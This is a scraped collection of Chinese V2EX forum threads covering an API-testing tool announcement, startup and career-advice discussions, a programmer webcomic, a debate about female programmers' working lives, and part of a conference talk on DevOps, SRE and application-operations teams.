{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Apizza 经过一年的发展，现在已经小有规模，值得欣慰，真心感谢 V2EX 各位小伙伴的支持和建议。</p>\n<p>Apizza 目前最新版本是 2.6</p>\n<p>官网 <a href=\"http://apizza.cc\" rel=\"nofollow\">http://apizza.cc</a></p>\n<p><img alt=\"file\" src=\"http://cdn.apizza.cc/static/Apizza.png\"></p>\n<p><img alt=\"file\" src=\"http://cdn.apizza.cc/static/apizzamarkdown.png\"></p>\n</div></div>"], "reply": "28", "tittle": "Apizza 一个专业的 api 在线管理，调试，测试工具。（可能很多小伙伴已经知道了^_^）", "comment": ["怎么跟 postman 那么像", "又升级了么，\r", "* 接口说明列表不支持 markdown", " 恩，接口说明是不支持 markdwon 的，这个我们会考虑。\r", "  体会一下，你就晓得和 postman 不一样哈", "* 还有就是协作的时候某人创建的某一条不可以修改这个属于谁的。\r", "   这点团队用着不是特别方便，不好拷贝也不好删除。\r", "* 再增加一个 oauth2 的 client 认证就更棒了。现在的解决方式直接新增一个接口单独用于获取 token 。", "跟 postman 好像", "名字中文是啥？\r", "API 渣渣？", " 好的，感谢。我们看下", "刚试了下，在开发模式下填写好的参数到了浏览模式下并没有啊，而且也不能修改添加请求参数\r", "顺便说参数注释那没有什么是否可选，默认值之类的选项么？然后自己根据默认值生成一个请求参数不是挺好？添加完了参数注释还有去添加请求参数，太麻烦了", " 可以的哈，你需要点击文档，然后把字段描述加上，（文档里面有个字段同步，可以自己把模拟的同步过来，不用手写哈）", " 然后你就可以在浏览模式看到了", "我帮楼主解释一下产品名字\r", "请跟我大声念 \r", " I have an API, I have a pizza.\r", "(Uhh~)API-pizza!\r", "APizza", "  I have an API, I have a pizza. \r", "(Uhh~)API-pizza! \r", "APizza  哈哈，对的", " #10 难道你这个参数注释是返回参数的注释？！！不是请求参数的，话说你这个错误码只能是 http 转态码么？不能是自定义结构里某个字段表示错误码？\r", "顺便说更重要的功能似乎是能提供接口可以上传接口定义啊，这样我们只有在框架里注释埋点，解析输出就可以了，统一处理，写完代码还得写文档，真是累人", " 第一：请求参数和返回参数都有注释，文档里面都可以写哈，第二 错误码只是针对接口返回，没有针对字段哈，我们可以考虑^_^第三：你说的这个功能我们还在规划中，敬请期待", "返回的 header 都看不到，醉了", "还是喜欢用 postman", " 我们是觉得 postman 文档不好使，不过他确实不错^_^", "亲。。你们怎么又换一个账号来宣传。。", " 这是官方账号呢 ^_^", "看起来不错，试用一段时间看看", "jmeter", "看了看。。。然后打开了 paw 继续用。 不过楼主加油。", "赞一个", "成都的公司，赞一个", "能和 POSTMAN 一样搞出一个独立 APP ，基于浏览器还是不方便", " 感谢\r", " 感谢\r", "\r", " 感谢\r", " 我们会在手机自适应这块做处理^_^", "很好，我选择 postman"]},
{"content": ["<div class=\"topic_content\">两次创业失败经历+多次见证创业失败的经历。不到 3 年工作经验的我已经是个十足的连续创业者了，为什么呢，因为我学历不高，但对技术和收入有着持续的追求。\r<br>好了，进入正题。经常有创业者对我说，我有个非常棒的 Idea ，市场前景非常好，你跟我做吧，搞出来绝对赚钱。然后不拉不拉一顿乱吹和意淫。他们总是对自己的想法充满信心，有的甚至都不给你说 Idea 的具体内容，只是不断的自我催眠和向别人画饼，还有人一本正经的出售自己的 Idea ，要价 80 万。我并不是否定所有创业者的 Idea ，我只是想说你对自己的 Idea 那么有信心，那我给你出个主意，你前期把产品外包出去，然后自己运营这个产品，后期可以招技术员工，并不需要什么技术合伙人，你可以掌握所有的股份以及绝对的话语权。并且项目做起来之后你的收益绝对远远高于你分股份给合伙人。不要给我说什么外包不靠谱，泄露商业机密，专业的外包公司技术一般都比较成熟，并不见得比你请的所谓的技术大牛差，而且目前外包这块竞争激烈，价格也压得比较低。至于泄露商业机密，你可以签商业竞争限制协议，并且我敢向你保证，绝大多数外包公司对你的项目并不感兴趣。那么你为什么还需要技术合伙人呢？无非就是想要免费的劳动力，想要分担风险的人，你对自己的项目并不是你说的那么自信。不要说什么你喜欢分享，钱这种东西有几人真的愿意去分享给他人。</div>"], "reply": "目前尚无回", "tittle": "我想做为一个技术人员和创业者撕下逼", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我就读于江苏一个不出名的二本，今年大三，因为校企合作的安排，下半年去一家企业实训，<a href=\"http://%E5%9F%B9%E8%AE%AD.net\" rel=\"nofollow\">培训.net</a> 相关，具体还不清楚。 目前在学 H5 、 JS 等，跟教授一起在做图像处理与字符识别相关项目。会 C#,但理解不深刻，比较浅薄，预见到明年就业会比较困难，在剩下的时间里想选择一个方向去深入、系统的学习（自学）。就业目标南京，暂时不换地点，请各位 V 友为我指点迷津，我该如何选择？ 是继续深入学 c#，还是别的什么东西？  就业前必备的技能点有多少？  很是迷茫，在此谢过。</p>\n</div></div>"], "reply": "14", "tittle": "<求助>就业前的迷茫与选择", "comment": ["一定不要碰移动端，最好别碰前端，可以试试后端", "不要签协议，自己找实习，别问我为什么知道", " 后端的话，主攻.net 在南京一块好做吗？   我见过的一些公司都是主做 java 的。", " 谢谢学长提醒。", "做 java", "如果方向做后端并且是.net ——肯定不明智\r", "\r", "前端 发展换代超快！—— H5 和浅薄的 JS 没卵用。。。\r", "\r", "看自己的兴趣吧 先锁定一个方向\r", "\r", "如果是后端， java 、 python / go 都靠谱", " @", "   谢谢建议", "java 和 python ，微软的东西，大公司才用得起，而大公司 HR 一般都会看学历，所以。。。  我只是实话实说，希望楼主不要介意。", " 我明白。  谢谢建议", "学 Java 吧，然后刷刷 GitHub ，写写项目", "不要学 .NET ，行业不景气。\r", "和教授的图像处理与字符识别有学术价值吗？如果有难度的话可以把心思放学术上，这个对你来说比学前端价值高多了。\r", "如果不值得做的话看看能不能找个好实习，不要去做外包的公司。\r", "实在不行的话，找几个队友组队参加比赛，做 App 的那种，学点后端或者 iOS Android 开发都不错。", "除了学语言外，有空刷刷 LeetCode 。", " 有一定的价值，虽然不是很多，涉及一些算法的研究。  @", " 谢谢建议", "我也在江苏上的大学"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"10101.Ep7.Title.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-0e66ca46cc560c1e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt1.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-92f230f72796c74c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt2.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-f58babd85f96e591.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt3.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-781364c409743381.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt4.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-52cc93d6363d7d75.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt5.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-c8d1717d7d0afed6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt6.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-eb4aa6c1c4b59589.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt6.5.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-b255a053f9af93e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt7.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-8425409cc347571e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt8.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-0ff7357268fac7e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt9.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-4e72659ad566e2a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt10.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-9631f3d332452734.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt11.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-6fcca687aeb946c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt12.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-0af42802707c7b61.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt13.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-af11f488af814b43.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt14.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-43916e43f5f9e912.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt15.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-07a48dd00fd5846d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt16.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-c13970183415b8be.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt17.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-c02738282827f517.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt18.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-f62c0eeff835a40f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt19.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-6acae94a48003a73.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt20.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-ac96413bd4896cbf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt21.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-79d0c2df35d0cc32.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt22.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-8fdc1cd7fb8f20e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt23.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-a53e49ab6c194e90.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt24.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-398635b91e1f6f7f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt25.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-b7117e612ee36100.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<p><img alt=\"10101.Ep7.Pt26.png\" src=\"http://upload-images.jianshu.io/upload_images/4181079-b5a950905b903505.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240\"></p>\n<h2>这里是吐槽</h2>\n<ul>\n<li>\n<p>许久没更新，突然有了灵感于是就更新了一话</p>\n</li>\n<li>\n<p>原本写的招商银行后来改成了枣山银行</p>\n</li>\n<li>\n<p>每到冬天就手指脱皮，打卡机就不让我下班</p>\n</li>\n<li>\n<p>其实阿壹的发型也重画了，不过觉得还是原本的样子更有风格</p>\n</li>\n<li>\n<p>年度最佳男主角：阿壹</p>\n</li>\n<li>\n<p>年度最佳男配角：摄影师</p>\n</li>\n<li>\n<p>不认识这个女角色？你一定没看<a href=\"http://szhshp.org/comic/2016/12/03/10101.ep2.html\" rel=\"nofollow\">      第二话 </a>2333</p>\n</li>\n<li>\n<p>不认识这个摄影师？你一定没看<a href=\"http://szhshp.org/comic/2016/12/18/10101.ep4.html\" rel=\"nofollow\">     第四话  </a>hhhh</p>\n</li>\n</ul>\n<h2>相关链接</h2>\n<p><a href=\"comic.szhshp.org\" rel=\"nofollow\">《 10101 》全章节列表</a></p>\n</div></div>"], "reply": "6", "tittle": "[程序员漫画] 《10101》EP7：荷包蛋的 Bug 什么时候戳破才好？", "comment": ["其实，如果用笔在纸上画，可能会更好些吧。这画得也太丑了点。。。", "没看懂。。", "说没看懂的是什么鬼", "支持。。漫画太少了。。", " 此作品处于连载状态，你可能需要参考之前的剧情，谢谢支持。\r", "//虽然一直都是泡面番根本没什么剧情可言 o(*≧▽≦)ツ", "看到后面，自动对号入座阿壹了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>调整了一下图片大小</p>\n<p><img alt=\"image\" src=\"http://static.geekbang.org/infoq/58bf9c7033b54.png\"></p>\n<p><img alt=\"image\" src=\"http://static.geekbang.org/infoq/58bf9c7231530.png\"></p>\n</div></div>"], "reply": "85", "tittle": "这是真实女程序员的生活状态吗？", "comment": ["请发高清的。", " 调整了一下~", "真实情况是，这么漂亮的女程序员，百里无一", "~哈哈", " 真想在此", "漫画肯定不是真实的，请发真人照片", "居然是靴子 不是拖鞋\r", "肯定是个假的程序媛 逃:)", "图源于 infoQ 公众号", "这两年我已经深切的感受到了什么叫区别对待", "感觉女性在工作中被弱化很大程度上是因为她们为了家庭生活而做出了很大牺牲.", " 新浪微博的邱晨，真女神级别", " #9 哈哈，合个影", "邱晨是女的？", " ", " #14 也许。。大概。。一毛一样？ ", " ", "这个好真实啊，不过现实中的女程序员少之又少啊，就算有，也奋斗不了几年的。", "女程序员我所见的都是挺受照顾的。楼上某位被人用哭泣营销来”黑“的，想想看如果哭泣营销发生在一个糙汉身上，更加画美不看。不要觉得男程序员之间的撕逼就很少一样。", " 一眼就瞄到了你的头像～ QAQ", "挺现实的吧。。", "然而，男程序员之间的撕逼更是多不胜数\r", "撕下女媛，就出来喊，被区别对待了....", "。。。 我一视同仁看待是起码的尊重", "我就是一个女程序员，你们说的我都没遇到过", "唉，干巴巴的文字和图片和内容", " 撕技术那叫一视同仁，撕性别那算什么？撕人品呢？", "这是有原因的，要不为啥以前出海不让女的上船。一个道理。", " 你是中世纪来的么？", "公司好几个没感觉有啥不同", "棒", "真实的情况就是看脸...\r", "\r", "漂亮的女程序员就是图 1 ，不漂亮的就是图 2 ，完", "#小林家的龙女仆", "可以，漫画画的不错", "很好，很强势。", "我面临的..是同样的技术水平,升职加薪的机会却没有男程序员多.\r", "当然,也被赋予了加班时不会被优先考虑\"\"不会被强烈指责\"等\"特权\"..\r", "什么时候讨论程序员不分男女了,什么时候不过三八节了,才是真正的\"平权\"..", "除了颜值之外没什么不对……", "公司的女程序员确实挺受欢迎啊，不过工作时就无所谓男女了。。。", "我刚刚面试就被性别歧视了，面试官直接说你的女性身份是我的顾虑之一，文章简直看哭~😭   好想找程序媛小姐姐求安慰。。", " 心疼两秒钟", "好想发帖子求深圳女程序员的集会，感觉程序媛越来越少了", " 不哭不哭，看看我的经历你会更安慰的。。。。", "老大对于女程序员都不规定哪天完成.", " 厉害了", "女孩子有三八假期，公司还给发福利，还比男同志多几个月产假， 求男女平等😂", "  问题是，这些加引号的特权，你不想要，很多姑娘都想要，现在很多姑娘依旧喜欢轻松简单的工作，哪怕钱少点。别人又不知道你究竟是哪种。", " 我以前和总监说，我管这个叫女程序员光环。。。手下一个妹子一有问题，光环一开，至少 3 、 4 个男的都过去了。。。围个圈子恨不得帮她把代码都重构了。。。\r", "\r", "（无性别歧视含义，大家都是这样过来的，说实话也看脸，那个妹子是挺好看的。。。）", "画的还真不错呢", "不是我说，好相处的男程序员需要帮忙了也同样很多人围着帮忙的。感觉宠爱这点并不是性别问题", "作为女程序员我必须发声了。。。首先，并不会像很多说的女程序员有特殊的优待，男程序员会比较照顾我们，并不会，你干的活不会比他们轻松！！其次，自从当了女程序员后，我从大学一个漂漂亮亮的妹子（不带吹嘘成分），变成了体重增加二十斤，每天带着个大眼镜，从来不化妆，素面朝天匆匆去上班的屌丝妹子，最重要的是还把身体搞垮了（久坐导致的腰疼，长期加班无法运动导致肥胖）！！所以，女程序员没那么好当！", "我也想养个黄狸", " 男程序员表示都没到这个程度", " 女生就不该当程序员，天天上十几个小时的班，也没什么差别对待，加班不会比男的少", " 早 9 晚 5 ，上班偶尔学习下新知识。回家跑步两小时，看书半小时，周未基本撸代码。表示对现在的状态很满意啊\r", "\r", "朋友，你是不是需要换个厂？", " 我想换到你的厂，你在哪个厂！！！", " \r", "\r", "邱晨在此，可我是男的 - -", "上一家公司有很多女程序员，我没见过哪个男程序员用女同事的相貌说事。\r", "倒是这个漫画，主题就是拿女程序员的相貌在说事。\r", "到底是谁看低了女程序员？", " 不过多出来的产假也不能算是不平等，毕竟孕妇需要承担的东西比工作要多得多。休息也一点都不轻松", "说到心坎里面去了", "中國傳統文化造成的罷了。\r", "\r", "幾十年前這篇土地還是男尊女卑的社會制度，傳承千年的思想早已根深蒂固。\r", "前一代人的很多人還是要男孩不要女孩，因為得傳承香火。而現在似乎男人多了幾千萬？沒有女孩了，似乎養個女孩比男孩省心，畢竟不需要為她準備房車什麼的。\r", "\r", "都說男女平等，可依舊有女士優先？\r", "男人打女人似乎就是天生的不對？( 打的不都是人麼\r", "男人對女人不溫柔一點就是啥——粗暴？( 女人對男人大吼大叫似乎可以有很多令人無法反駁的理由\r", "\r", "---\r", "\r", "想要男女平等，起碼自己的心態就得調整過來。\r", "男人是人，女人不也一樣是人麼，該怎麼做就怎麼做便是。\r", "但改變心態並不是那麼的容易。\r", "\r", "比如，女人覺得自己受到了不公。的確，太多人都是這個思想了，你無法改變。你能做的僅僅是改變自己，影響身邊的人的。想要改變這些，起碼自己就得做到沒有這些態度和習慣。有朋友按照女士優先的慣例讓你先做什麼事的時候，你就得告訴他不需要，然後解釋一下。久而久之，就都記住了你的獨特習慣。\r", "\r", "如果你自身的態度沒有改變，不想受到歧視，但是又想享受性別的特權。除非是你非常要好的朋友，其他人都不會依著你的吧？\r", "\r", "---\r", "\r", "不願試圖改變，那你還是接受吧。\r", "因為，抱怨也沒用。", "真正漂亮的还有能力带动项目的女程序员全中国感觉可以用手指数过来.化妆术的就不要说了.", " 提议不错，生孩子的任务给你，那其余的假都给你给你，全是你的，让你占优势行不", " \r", "\r", "其实就是一句话，多大的责任享受多大的权力。", "嘿嘿，我觉得我还算混的好\r", "产品、老大、运维、 DBA 都挺认可我的（嘿嘿）\r", "\r", "不过也在忧虑以后的发展\r", "毕竟年龄都是个坎了\r", "加上性别，不可说不令人担忧自己的前途啊", "啊 真想找个女程序员", " 你的理解和我說的好像對不上去。", "女程序员在此，觉得没啥区别", "非程序猿的人会程序员第一印象都是 带眼镜，内向，不爱打扮。 其实不然程序员外向的比内向的多太多了。爱打扮的更多，不戴眼镜的更多。 这就是所谓的既定印象。 对不了解程序员的人来说只能通过 影视、杂志等渠道去了解。 没有接触得来的结论都是不负责任的。", "现实生活中女程序员比咱男的还爷们儿，亲身体会", "看见公司的女程序员，会觉得很帅，技术肯定很屌。尤其是做硬件的女同事，给我一种美剧《奔腾年代》中卡梅伦的感觉", " 兔几是你吗", " 程序员妹子在这。。没这么夸张啊 下班健身房 不然别的工作坐久了也容易发福的", " 开玩笑的啦，知道女生辛苦。", "“我希望做几年技术岗位，然后转向项目管理或者产品之类的岗位。我觉得女生嘛，不太适合在技术岗位一直做下去。”\r", "\r", "每当听到女生这么说的时候，我心里都默默吐槽……", "女的做做测试不错啊  细心", " 难道天天上十几个小时班就适合男程序员了，这是什么逻辑...\r", "\r", "那张图说女程序员私下是软妹的不太现实，不是程序员的不是软妹不看言情国产剧的也海了去了。", " 一直觉得三八节其实没必要放假....至于产假，男的要是能怀胎十月从下面扯出个小西瓜大小的东西也应该也是会有人放的，不生孩子的女人也没得放产假啊，凭什么不生孩子的男人就可以放产假了呢..", " 你把漂亮换成英俊，女换成男，也是一样的....我真的没见过很帅的中国男程序员，最多也就是普通人里算比较好看的，希腊男神影视明星那种程度的从没见过...顶着啤酒肚的大叔倒是很多...", " 真破酱娃？ 为什么我身边就没有一个会开飞机的萌妹呢", "⊙▽⊙找个女神带带我", "我们公司的女程序员特别厉害，算是技术负责人，关键是长的还漂亮。。。", " 这么幸运，，我到现在都没见过女技术员。", " 某外企软件公司某 office 总裁就女的，程序员出身，屌得很。。。", " 大哥，我真是开玩笑的，何必这么猛地怼我呢☹️", " \r", "你应该称呼人家小妹……", " 其实男的也可以放产假啊，如果是爸爸，照顾产妇和小孩的，很多公司都有吧....不过凭空说什么要产假就很逗了，那是为了照顾生孩子的人设置的，而且那几天假期比起生小孩的痛苦和风险真的算不了什么，即使是对男的也一样（除非拿产假来好吃懒做而不是换尿布喂奶粉）", "我很讨厌别人把程序员当成修电脑的，还提出写游戏外挂这样无厘头的需要。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><strong>导读：</strong>[GO SRE ！] 为<a href=\"www.shurenyun.com\" rel=\"nofollow\">数人云</a>SRE 系列活动专题，本文是 3 月 4 日北京站线下活动“当西方的 SRE 遇上东方的互联网”中京东金融王超老师的分享。</p>\n<p>他将从 SRE ， Devops ， PE 间的关系开始，介绍企业该如何构建适合自己的运维组织架构并管理团队，讲解持续交付、监控、容量规划等具体运维场景实操，从工程实践的角度解读大规模复杂化的业务场景下运维指导思想的落地。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/2H5K09B7.png\"></p>\n<p><strong>王超 / 京东金融企业高级 PE</strong></p>\n<p>目前在京东金融平台负责一个 20 人左右的应用运维团队（ PE 团队），也曾负责人人网 PE 团队。现阶段主要关注运维与业务的融合、业务可用性保障，运维平台建设和团队管理。</p>\n<hr>\n<p>我是今天最后的演讲者，前面几位都是很知名的运维专家，对大家提到的很多运维痛点我都感同身受，谈到国内运维行业的发展，我没有在国外工作的经验，今天讲的经验都是我在国内不算美好的 IT 行业环境下的亲身实践和总结，其中也吸收了很多国内运维行业专家前辈的指点，希望对大家有借鉴的意义。</p>\n<p>刚毕业时我在一家世界 500 强的传统行业公司信息中心做应用运维，后来换到人人网，再后来就是京东金融。从传统行业跳到人人网的时候，加入的是一个刚建立的技术运维团队，我从初期的运维工程师，成长为后来的运维主管。 2014 年到京东金融的时候，从 0 开始搭建起整个应用运维团队，从初期建设团队到一个比较稳定的状态，把公司的业务支撑好，这里面有很多经验可以和大家分享。</p>\n<h2>DevOps</h2>\n<p>DevOps 是传统瀑布流的交付方式中的 Dev （开发）和 Ops （运维）的关系。</p>\n<p>开发和运维有一个矛盾点，开发的人觉得写好代码交给运维，就可以上线部署了，后面的事与我无关。代码像炸弹一样，上线后如果出了问题总是运维背锅。运维的人觉得开发的人总是找麻烦，总是不靠谱，于是把控变更的次数和审核流程，使开发的人不能申请更多的上线，比如一个星期只允许上线一次，就这样阻碍了业务的发展。 DevOps 解决了这个矛盾，协调了技术运营、 QA 还有开发三者间的关系。</p>\n<h3>DevOps 误区</h3>\n<p><img alt=\"\" src=\"https://i.v2ex.co/7h18wdZ0.jpeg\"></p>\n<p>国内有很多错误的做法，比如写着招聘 DevOps 职位，但描述的工作职责跟传统的运维没有太多明显的变化，还是做发布和 SA ；有的团队把名字改成了 DevOps ，但是做的是运维开发的工作，要注意“运维开发”不是 DevOps 。 DevOps 是一个落实到团队里的文化理念和最佳实践，不只是运维团队做，也不只是开发团队做，而是大家一起做 DevOps ，甚至有可能单独设有有一些协调员去做发布、交付工作。所以， DevOps 不只是一个团队的名称。</p>\n<p>我在人人网的时候， DevOps 的概念比较火，公司建了一个 DevOps 团队，后来在专家的指点下，我们把团队名称改成了 PE 团队。另外， DevOps 并不是系统管理员加上自动化工具就够了，在部门里， SA 做发布用了很多自动化的工具，但大家要知道，自动化只是一种手段和工具，要想好最终的目标解决的是怎样的问题。最后， DevOps 也不是把 root 权限给了开发人员。开发的人员有 root 权限会引入很大的风险， DevOps 需要控制这个风险。</p>\n<h3>DevOps 技术目标</h3>\n<p><img alt=\"\" src=\"https://i.v2ex.co/f9ClJ9Up.jpeg\"></p>\n<h3>DevOps 的最终目标</h3>\n<p><img alt=\"\" src=\"https://i.v2ex.co/293o5bQk.jpeg\"></p>\n<p>DevOps 的最终目标是建立一个流水线、准实时交互及时性的业务流程，快速把产品推上线，产生业务价值，最大化业务输出。做事一定要想公司的路线图是什么，公司要做什么样的事情。公司新发布一个产品，上线一个在社交网站上的新消息流功能，目标就应该是把这个功能推上线，服务更多的人，而不是简简单单的做一个工单的处理。目标不一样，结果也是不一样的。</p>\n<p>从技术的角度或者是架构的角度来讲， DevOps 需要快速部署的平台。这一点是大家都很认可的，很多现在 DevOps 培训都仅仅做技术上的快速部署平台，但是缺少对 DevOps 其他方面的培训。 DevOps 真正的价值是由业务的结果判断的。最大化输出业务，而不止是 IT 项目的范围或成果，就是对业务产生了多大的影响。</p>\n<p>Facebook 里有两个词说得特别多，一个是 Vision （视野），另一个是 Impact （影响力）。做事前想想这件事对公司是不是有正向的影响，影响力有多大？视野加上影响力很重要。举个例子，做一个架构的组件，可能短期内公司用不上，但是在明年也许会产生很大的效果，产生很大的改变，那就可以做。做完以后今年可能没有产生效果，但是明年可能对几十人、上百人的开发效率产生非常大的提升，这就是有意义的。所以要看最终的结果，而不只从一个项目的角度去考虑。</p>\n<h3>DevOps 速度&amp;业务连续性</h3>\n<p><img alt=\"\" src=\"https://i.v2ex.co/66EDG95T.jpeg\"></p>\n<p>双峰挑战。系统基本上都可以分为这两类：是关注于快速上线的交互型系统，还是关注业务的连续性的记录型（ SOR ）系统。我们公司是做金融的，其中的交易系统就属于对业务连续性要求特别高的。有些产品则更关注于速度，比如 web 、 app 的开发，上线后如果有问题马上回退就好，对用户不会产生特别大的影响，这就是典型的交互型系统，这类系统也比较适合用 DevOps 。要区分系统是否适合 DevOps ，银行、证券的的核心系统要把控好，不够成熟就不要上 DevOps 。</p>\n<h3>DevOps 风险&amp;安全</h3>\n<p>DevSecOps 就是除了 DevOps ，还要注意安全。互联网公司对三点很关注，那就是速度、成本和质量。要快速的上线、快速的迭代，也要控制好成本。质量不能出问题，业务连续性不能断，如果经常丢数据，业务不能使用，公司的品牌会受到很大的影响。金融公司则更关注于安全，假如数据被窃取了，用户数据或交易纪录被篡改，是致命的。数据非常重要，所以 DevOps 里又加了一个 DevSecOps 。</p>\n<p>关注风险，但没有绝对的安全。 DevOps 的经典书籍《凤凰工程》里有一段情节，有个做审计的人总是特别郁闷，因为总觉得 IT 的人不按审计的要求去修复所有问题，会出非常大的问题。但是最终的结果是审计成功通过，因为公司里财务的人通过业务上的检查，解决了发现的安全问题，也就是说即使 IT 上存在一些问题，也可以通过业务的方式弥补，达到最终的安全。 DevOps 告诉我们，你要关注风险而不简单是安全，在避免风险的前提下，制度不应妨碍业务的发展和交互。另外，也要通过技术提升安全，简化流程，尽量实现自动化。设计流程很容易，很多公司里面都有特别多的工单，但是你要想你的工单是不是有作用？比如说是不是所有的项目的上线都需要安全的人审核，如果能自动判断没有风险的话，能否自动化流转？</p>\n<p>DevSecOps 和 DevOps 一样，也要加强人与人之间的沟通、协作，负责安全的人应该和开发、运维、测试人员一起防范风险。</p>\n<h2>SRE</h2>\n<p><img alt=\"\" src=\"https://i.v2ex.co/37oojZys.jpeg\"></p>\n<p>谈谈 SRE ， SRE 需要负责可用性、时延、性能、效率、变更管理、监控、应急响应和容量管理等相关的工作，包括工程研发、日常运维以及监控响应方向的工作。</p>\n<h2>深究 PE</h2>\n<p>重点分享我正在做的 PE 是什么，先介绍一下 PE 的起源。大家比较认可的是从雅虎开始流行的，国内最大的团队就是阿里的 PE 团队，后来受阿里影响很多公司也设了 PE 职位。 PE 这个词有的叫产品运维工程师，有的叫业务运维工程师，也可以直接认为就是应用运维团队，简单来说就是负责业务或应用相关的一系列工程上的事务。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/WIPsfN70.jpeg\"></p>\n<p>这是 Facebook 的招聘描述， PE 既拥有软件也拥有系统方面知识的工程师，要保障 Facebook 的服务平滑的运行，有足够的容量满足未来的规划。这也是刚才说的 Facebook 很强调两点：一个是视野，一个是影响力。技术人要有视野，能预见公司未来的业务发展，根据视野做设计。一方面要保证服务平滑运行，另一方面要满足未来的容量规划，以此设计基础组件，要有长久规划设计的能力。每个 Facebook 产品，包括基础设施，都有 PE 的人。</p>\n<p>听阿里毕玄老师说，阿里的 PE 团队打散到不同的 BU 业务单元里。大家要根据自身的情况考虑， Facebook 团队比较大，每个大团队都有两个 PE 的人跟进，他们有广阔的视野和经验，背景也比较好，从整个团队来看，既有新人也有老手，组成了多样化的团队。</p>\n<p><img alt=\"\" src=\"https://i.v2ex.co/39sKkt91.jpeg\"></p>\n<p>除了写代码， PE 也要会写文档。做运维的人一定不要抗拒写文档，不管在哪里，文档都很重要。好的文档能把事情描述清楚，给别人去看，传播给更多人，而不只是在自己的脑子里面。 PE 要做容量规划，像京东每年都有两次大促， 618 大促，双十一大促， PE 要规划容量和性能能否够满足业务的发展。 PE 需要调试处理最困难的问题，所有运维都知道调试排查问题（ Trouble Shooting 